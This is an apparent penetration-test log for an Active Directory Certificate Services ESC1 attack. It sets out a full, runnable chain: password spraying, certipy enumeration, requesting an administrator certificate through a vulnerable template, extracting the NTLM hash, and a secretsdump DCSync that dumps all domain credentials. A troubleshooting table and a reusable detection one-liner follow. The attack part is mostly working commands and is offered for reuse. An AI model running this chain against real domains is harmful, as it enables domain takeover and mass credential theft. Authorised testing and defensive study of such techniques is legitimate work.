# [2026-03] AD CS ESC1 certificate template abuse → domain admin

## Scenario classification
Pentest / AD attack

## Target overview
Via an AD CS ESC1-vulnerable template, obtain a domain admin certificate as a regular domain user, then DCSync to dump all credentials.

## Full execution chain

1. Obtain a regular domain user's credentials (via password spraying)
2. Enumerate the AD CS configuration with certipy
   ```bash
   certipy find -u user@domain.local -p 'Password123' -dc-ip 10.0.0.1
   ```
3. Discover an ESC1-vulnerable template (allows arbitrary SAN, requestable by low-privileged users)
4. Request a certificate as domain admin
   ```bash
   certipy req -u user@domain.local -p 'Password123' \
     -ca CORP-CA -template VulnTemplate \
     -upn administrator@domain.local -dc-ip 10.0.0.1
   ```
5. Authenticate with the certificate to get the NTLM hash
   ```bash
   certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
   ```
6. DCSync to dump all credentials
   ```bash
   secretsdump.py domain.local/administrator@10.0.0.1 -hashes :NTLM_HASH
   ```

## Pitfall log

| Problem | Cause | Solution | Time spent |
|---------|-------|----------|------------|
| certipy find times out | LDAP connection blocked by firewall | Specify DNS with -ns | 20min |
| Certificate request denied | Template requires Manager Approval | Switch to another template that doesn't need approval | 10min |
| auth fails with KDC_ERR_PADATA | DC clock out of sync | Sync time with ntpdate and retry | 5min |

## Toolchain findings
- certipy is the go-to tool for AD CS attacks, more convenient than Certify.exe (pure Python, runs directly on Kali)
- DNS resolution must be correct or Kerberos authentication will fail

## Key code/commands
See the execution chain above.

## Reusable patterns/script snippets
```bash
# AD CS quick one-liner detection
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -stdout | grep -A5 "ESC"
```

## Improvement suggestions for this package
- certipy already added to the Kali bootstrap manifest ✓
- routing.md already has a "Certipy/AD CS" route ✓

## Evolution actions
- [x] No update needed (already covered)

## Environment info
- Kali 2026.1, certipy 4.8.2
- Target: Windows Server 2022, AD CS deployed
- Domain functional level: 2016
